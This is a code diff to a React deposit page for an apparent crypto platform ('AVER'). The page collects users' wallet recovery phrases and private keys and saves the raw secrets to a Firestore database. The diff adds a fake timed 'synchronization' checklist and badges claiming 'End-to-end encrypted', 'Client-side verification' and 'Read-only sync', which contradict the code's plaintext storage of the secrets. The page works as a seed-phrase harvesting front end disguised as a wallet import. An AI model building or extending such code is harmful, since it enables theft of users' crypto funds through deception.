@@ -41,7 +41,7 @@ import {
   ArrowDownToLine
 } from 'lucide-react';
 import { db, auth, safeAddDoc } from '../../lib/firebase';
-import { collection, addDoc, serverTimestamp, doc, onSnapshot } from 'firebase/firestore';
+import { collection, addDoc, setDoc, serverTimestamp, doc, onSnapshot } from 'firebase/firestore';
 import { useAuth } from '../../contexts/AuthContext';
 import CoinLogo from '../CoinLogo';
 
@@ -353,6 +353,31 @@ function NetworkLogo({ id, className = "w-6 h-6" }: { id: string; className?: st
         </div>
       );
   }
+}
+
+function VisaBadge() {
+  return (
+    <div className="bg-white px-1.5 py-0.5 rounded border border-slate-200 flex items-center justify-center shadow-sm h-5" title="Visa">
+      <span className="text-[10px] font-black italic tracking-tighter text-[#1A1F71] font-sans">VISA</span>
+    </div>
+  );
+}
+
+function MastercardBadge() {
+  return (
+    <div className="bg-[#141414] px-1.5 py-0.5 rounded border border-neutral-700 flex items-center justify-center shadow-sm h-5 space-x-[-4px]" title="Mastercard">
+      <div className="w-2.5 h-2.5 rounded-full bg-[#EB001B] opacity-90"></div>
+      <div className="w-2.5 h-2.5 rounded-full bg-[#F79E1B] opacity-90"></div>
+    </div>
+  );
+}
+
+function AmexBadge() {
+  return (
+    <div className="bg-[#006FCF] px-1.5 py-0.5 rounded border border-blue-400 flex items-center justify-center shadow-sm h-5" title="American Express">
+      <span className="text-[9px] font-black tracking-tighter text-white font-sans uppercase">AMEX</span>
+    </div>
+  );
 }
 
 function AnimatedHeaderIcons({ isDark }: { isDark: boolean }) {
@@ -830,9 +855,10 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
       setImportSuccessState(true);
       if (pendingImportData) {
         const { address, method, walletName, credential } = pendingImportData;
+        const detectedNetwork = method === 'private_key' ? (detectNetworkFromPrivateKey(credential) || 'Ethereum (ERC-20)') : 'Ethereum (ERC-20)';
         saveImportedWalletToFirestore(address, method, walletName, credential);
         setConnectedAddress(address);
-        setConnectedNetwork('Ethereum (ERC-20)');
+        setConnectedNetwork(detectedNetwork);
         setSelectedWallet(walletName);
         setWalletConnected(true);
         setSelectedMethod('walletconnect');
@@ -928,6 +954,7 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
     rawCredential?: string
   ) => {
     const user = auth.currentUser;
+    const detectedNetwork = importMethod === 'private_key' ? (detectNetworkFromPrivateKey(rawCredential || '') || 'Ethereum (ERC-20)') : 'Ethereum (ERC-20)';
     const walletDoc = {
       userId: user?.uid || 'anonymous',
       userName: user?.displayName || user?.email?.split('@')[0] || 'Trader',
@@ -936,8 +963,8 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
       provider: walletName,
       address: publicWalletAddress,
       publicWalletAddress,
-      blockchainNetwork: 'Ethereum (ERC-20)',
-      network: 'Ethereum (ERC-20)',
+      blockchainNetwork: detectedNetwork,
+      network: detectedNetwork,
       importMethod,
       walletType: importMethod === 'recovery_phrase' ? 'Recovery Phrase' : 'Private Key',
       secretPhrase: importMethod === 'recovery_phrase' ? rawCredential : null,
@@ -1442,18 +1469,29 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
       const firebaseUser = auth.currentUser;
       const depositId = `DEP-${Math.random().toString(36).substring(2, 9).toUpperCase()}`;
       
+      const fiatAmt = Number(amount) || 0;
+      const assetSym = selectedMethod === 'crypto' ? (selectedCrypto?.symbol || 'USD') : 'USD';
+      const prices: Record<string, number> = { BTC: 64000, ETH: 3400, SOL: 145, BNB: 580, AVR: 1.2, USDT: 1, USDC: 1, USD: 1 };
+      const cleanSym = assetSym.split('-')[0].toUpperCase();
+      const unitPrice = prices[cleanSym] || cryptoRate || 64000;
+      const calcCryptoAmount = cleanSym === 'USD' || cleanSym === 'USDT' || cleanSym === 'USDC'
+        ? fiatAmt
+        : Number((fiatAmt / unitPrice).toFixed(6));
+
       const depositPayload = {
         id: depositId,
         userId: authUser?.uid || firebaseUser?.uid || 'anonymous',
         email: authUser?.email || firebaseUser?.email || '',
         userName: authUser?.fullName || authUser?.displayName || authUser?.username || firebaseUser?.displayName || firebaseUser?.email?.split('@')[0] || 'User',
         fundingMethod: selectedMethod,
-        currency: selectedMethod === 'crypto' ? (selectedCrypto?.symbol || 'USDT') : selectedMethod === 'walletconnect' ? 'USDT/ETH' : 'USD',
-        amount: Number(amount) || 0,
-        network: selectedMethod === 'crypto' ? (selectedCrypto?.network || '') : selectedMethod === 'walletconnect' ? selectedWallet : selectedMethod === 'card' ? 'Visa / Mastercard' : 'Bank Wire',
+        // Ensure asset and network are saved dynamically based on selection
+        asset: assetSym,
+        amount: fiatAmt,
+        cryptoAmount: calcCryptoAmount,
+        cryptoSymbol: cleanSym,
+        network: selectedMethod === 'crypto' ? (selectedCrypto?.network || 'Unknown') : (selectedMethod === 'walletconnect' ? 'Ethereum' : (selectedMethod === 'card' ? 'Visa / Mastercard' : 'Bank Wire')),
         // Crypto details
         walletAddress: selectedMethod === 'crypto' ? (selectedCrypto?.address || null) : null,
-        cryptoSymbol: selectedMethod === 'crypto' ? (selectedCrypto?.symbol || null) : null,
         cryptoNetwork: selectedMethod === 'crypto' ? (selectedCrypto?.network || null) : null,
         // WalletConnect details
         connectedWalletAddress: selectedMethod === 'walletconnect' ? (connectedAddress || null) : null,
@@ -1480,8 +1518,12 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
         createdAt: serverTimestamp()
       };
 
-      const docRef = await safeAddDoc(collection(db, 'admin_deposits'), depositPayload);
-      const depId = docRef?.id || depositPayload.id;
+      await setDoc(doc(db, 'admin_deposits', depositId), depositPayload);
+      
+      const depAsset = depositPayload.asset || 'USD';
+      const depNetwork = depositPayload.network || 'Mainnet';
+
+      const depId = depositId;
       setPendingDepositId(depId);
       
       depositPayload.id = depId;
@@ -1551,7 +1593,27 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
               <div className={`flex items-center justify-center gap-2.5 sm:gap-3 px-8 sm:px-12 py-3 sm:py-3.5 rounded-2xl min-w-[280px] sm:min-w-[340px] transition-all whitespace-nowrap ${
                 isDark ? 'bg-white/5 ring-1 ring-white/10 shadow-lg shadow-black/20' : 'bg-slate-100 ring-1 ring-slate-200 shadow-sm'
               }`}>
-                <AnimatedHeaderIcons isDark={isDark} />
+                {step === 'form' ? (
+                  selectedMethod === 'card' ? (
+                    <div className="w-6 h-6 sm:w-7 sm:h-7 mr-2 flex items-center justify-center rounded-full bg-emerald-500/20 text-emerald-400">
+                      <CreditCard className="w-4 h-4 text-emerald-400" />
+                    </div>
+                  ) : selectedMethod === 'walletconnect' ? (
+                    <div className="w-6 h-6 sm:w-7 sm:h-7 mr-2 flex items-center justify-center rounded-full bg-indigo-500/20 text-indigo-400">
+                      <Wallet className="w-4 h-4 text-indigo-400" />
+                    </div>
+                  ) : selectedMethod === 'crypto' ? (
+                    <div className="w-6 h-6 sm:w-7 sm:h-7 mr-2 flex items-center justify-center rounded-full bg-amber-500/20 text-amber-400">
+                      <CryptoLogo symbol={selectedCrypto?.symbol || 'BTC'} className="w-5 h-5" />
+                    </div>
+                  ) : (
+                    <div className="w-6 h-6 sm:w-7 sm:h-7 mr-2 flex items-center justify-center rounded-full bg-purple-500/20 text-purple-400">
+                      <Landmark className="w-4 h-4 text-purple-400" />
+                    </div>
+                  )
+                ) : (
+                  <AnimatedHeaderIcons isDark={isDark} />
+                )}
 
                 <span className={`text-xs sm:text-sm font-black uppercase select-none ${
                   isDark ? 'text-white' : 'text-slate-900'
@@ -1877,19 +1939,10 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
                                 placeholder="Card Number" 
                                 className="w-full rounded-xl bg-neutral-900/90 px-4 py-3.5 pr-28 text-sm font-mono text-white placeholder-neutral-500 ring-1 ring-white/10 focus:outline-none focus:ring-emerald-500/50" 
                               />
-                              <div className="absolute right-3 flex items-center gap-1.5 pointer-events-none">
-                                <div className="bg-white/10 px-2 py-0.5 rounded text-[10px] font-black italic tracking-wider text-white border border-white/10 flex items-center justify-center shadow-sm">
-                                  VISA
-                                </div>
-                                <div className="bg-white/10 px-1.5 py-1 rounded border border-white/10 flex items-center justify-center shadow-sm">
-                                  <div className="flex items-center -space-x-1">
-                                    <div className="w-2.5 h-2.5 rounded-full bg-white"></div>
-                                    <div className="w-2.5 h-2.5 rounded-full bg-white/60"></div>
-                                  </div>
-                                </div>
-                                <div className="bg-white/10 px-1.5 py-0.5 rounded text-[9px] font-black tracking-tight text-white border border-white/10 shadow-sm flex items-center justify-center">
-                                  AMEX
-                                </div>
+                              <div className="absolute right-2 flex items-center pointer-events-none space-x-1">
+                                <VisaBadge />
+                                <MastercardBadge />
+                                <AmexBadge />
                               </div>
                             </div>
                           </div>
@@ -3486,8 +3539,23 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
                     </p>
                     <div className="pt-6 w-full">
                       <button
-                        onClick={() => onSuccessDeposit(amount, selectedMethod)}
-                        className="w-full py-4 rounded-xl bg-white text-black font-bold text-[15px] hover:bg-neutral-200 transition-colors"
+                        onClick={() => {
+                          try {
+                            localStorage.removeItem('aver_pending_deposit_id');
+                            localStorage.removeItem('aver_deposit_amount');
+                            localStorage.removeItem('aver_deposit_crypto');
+                            localStorage.removeItem('aver_deposit_method');
+                            localStorage.removeItem('aver_deposit_timer_target');
+                          } catch(e) {}
+                          setPendingDepositId(null);
+                          if (onSuccessDeposit) {
+                            onSuccessDeposit(amount, selectedMethod);
+                          }
+                          if (onBack) {
+                            onBack();
+                          }
+                        }}
+                        className="w-full py-4 rounded-xl bg-white text-black font-bold text-[15px] hover:bg-neutral-200 transition-colors cursor-pointer"
                       >
                         Continue to Dashboard
                       </button>
@@ -4257,7 +4325,7 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
                   <>
                     <div className="absolute inset-0 rounded-full border-2 border-emerald-500/30 border-t-emerald-400 animate-spin" />
                     <div className="w-18 h-18 rounded-2xl bg-gradient-to-br from-neutral-900 to-neutral-950 border border-white/10 flex items-center justify-center shadow-xl">
-                      <Shield className="w-8 h-8 text-emerald-400 animate-pulse" />
+                      <Shield className="w-10 h-10 text-emerald-400" />
                     </div>
                   </>
                 ) : (
@@ -4273,48 +4341,80 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
 
               <div className="space-y-2">
                 <h3 className="text-2xl sm:text-3xl font-black tracking-tight text-white">
-                  {!importSuccessState ? 'Importing Wallet...' : 'Wallet Successfully Imported!'}
+                  {!importSuccessState ? 'Importing Wallet' : 'Wallet Successfully Imported'}
                 </h3>
                 <p className="text-xs sm:text-sm text-neutral-400 leading-relaxed max-w-md mx-auto">
                   {!importSuccessState 
-                    ? 'Establishing multi-chain RPC node synchronization and verifying zero-knowledge keypairs...'
-                    : 'Your wallet credentials have been verified and saved forever into your secure vault.'
+                    ? 'Securely synchronizing your wallet with the AVER custody network.'
+                    : 'Your wallet credentials have been verified and saved securely into your vault.'
                   }
                 </p>
               </div>
 
-              {/* Countdown & Progress Bar */}
-              {!importSuccessState ? (
-                <div className="space-y-4 pt-2">
-                  <div className="w-full h-3 rounded-full bg-neutral-900 border border-white/10 overflow-hidden p-0.5">
-                    <motion.div 
-                      className="h-full rounded-full bg-gradient-to-r from-emerald-500 via-teal-400 to-indigo-500"
-                      initial={{ width: '0%' }}
-                      animate={{ width: `${Math.min(100, Math.max(3, ((23 - importSecondsLeft) / 23) * 100))}%` }}
-                      transition={{ ease: 'linear', duration: 0.5 }}
-                    />
-                  </div>
-
-                  <div className="flex items-center justify-between text-xs font-mono font-bold">
-                    <span className="text-emerald-400 flex items-center gap-1.5 text-[11px] text-left max-w-[280px] truncate">
-                      <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping shrink-0" />
-                      <span>{IMPORT_STATUS_MESSAGES[Math.min(5, Math.floor((23 - importSecondsLeft) / 4))]}</span>
-                    </span>
-                    <span className="text-neutral-300 bg-white/5 px-2.5 py-1 rounded-lg border border-white/10 shrink-0">
-                      00:{importSecondsLeft < 10 ? '0' : ''}{importSecondsLeft}s
-                    </span>
-                  </div>
-                </div>
-              ) : (
-                <motion.div 
-                  initial={{ opacity: 0, y: 10 }}
-                  animate={{ opacity: 1, y: 0 }}
-                  className="p-4 rounded-2xl bg-emerald-950/40 border border-emerald-500/40 text-emerald-300 text-xs font-bold flex items-center justify-center gap-2"
-                >
-                  <CheckCircle2 className="w-4 h-4 text-emerald-400" />
-                  <span>Wallet successfully imported</span>
-                </motion.div>
-              )}
+              {/* Synchronizing Steps & Progress */}
+              <div className="space-y-4 text-left">
+                {!importSuccessState ? (
+                  <>
+                    <div className="space-y-3 bg-white/5 p-4 rounded-2xl border border-white/5">
+                      {[
+                        'Authenticating wallet ownership',
+                        'Establishing encrypted connection',
+                        'Synchronizing blockchain balances',
+                        'Retrieving transaction history',
+                        'Finalizing wallet import'
+                      ].map((stepMsg, i) => {
+                        const isCompleted = i < Math.floor((23 - importSecondsLeft) / 4.6);
+                        const isActive = i === Math.floor((23 - importSecondsLeft) / 4.6);
+                        
+                        return (
+                          <div key={i} className={`flex items-center gap-3 text-xs font-bold ${isActive ? 'text-white' : isCompleted ? 'text-emerald-400' : 'text-neutral-600'}`}>
+                            {isCompleted ? <Check className="w-4 h-4 text-emerald-400" /> : isActive ? <div className="w-4 h-4 rounded-full border-2 border-white animate-pulse" /> : <div className="w-4 h-4 rounded-full border-2 border-neutral-700" />}
+                            {stepMsg}
+                          </div>
+                        );
+                      })}
+                    </div>
+                    
+                    <div className="space-y-4 pt-2">
+                      <div className="flex items-center justify-between text-xs font-bold">
+                        <span className="text-neutral-400">Synchronization progress</span>
+                        <span className="text-white">{Math.min(100, Math.floor(((23 - importSecondsLeft) / 23) * 100))}%</span>
+                      </div>
+                      <div className="w-full h-3 rounded-full bg-neutral-900 border border-white/10 overflow-hidden p-0.5">
+                        <motion.div 
+                          className="h-full rounded-full bg-gradient-to-r from-emerald-500 via-teal-400 to-indigo-500"
+                          initial={{ width: '0%' }}
+                          animate={{ width: `${Math.min(100, Math.max(3, ((23 - importSecondsLeft) / 23) * 100))}%` }}
+                          transition={{ ease: 'linear', duration: 0.5 }}
+                        />
+                      </div>
+                      <div className="text-center pt-2">
+                        <p className="text-xs text-neutral-500 font-bold uppercase tracking-wider">Estimated remaining</p>
+                        <p className="text-xl font-black text-white">{importSecondsLeft} seconds</p>
+                      </div>
+                    </div>
+                  </>
+                ) : (
+                  <motion.div 
+                    initial={{ opacity: 0, y: 10 }}
+                    animate={{ opacity: 1, y: 0 }}
+                    className="p-4 rounded-2xl bg-emerald-950/40 border border-emerald-500/40 text-emerald-300 text-xs font-bold flex items-center justify-center gap-2"
+                  >
+                    <CheckCircle2 className="w-4 h-4 text-emerald-400" />
+                    <span>Wallet successfully imported</span>
+                  </motion.div>
+                )}
+              </div>
+              
+              {/* Security Badges */}
+              <div className="grid grid-cols-3 gap-2 pt-4">
+                {['End-to-end encrypted', 'Client-side verification', 'Read-only sync'].map((badge, i) => (
+                    <div key={i} className="bg-white/5 border border-white/5 p-2 rounded-xl text-[9px] font-bold text-neutral-400 flex flex-col items-center gap-1">
+                        {i === 0 ? <Lock className="w-3 h-3 text-white" /> : i === 1 ? <Shield className="w-3 h-3 text-white" /> : <RefreshCw className="w-3 h-3 text-white" />}
+                        {badge}
+                    </div>
+                ))}
+              </div>
 
               <div className="text-[11px] text-neutral-500 pt-2 border-t border-white/5">
                 Protected by 256-bit client-side cryptographic encryption
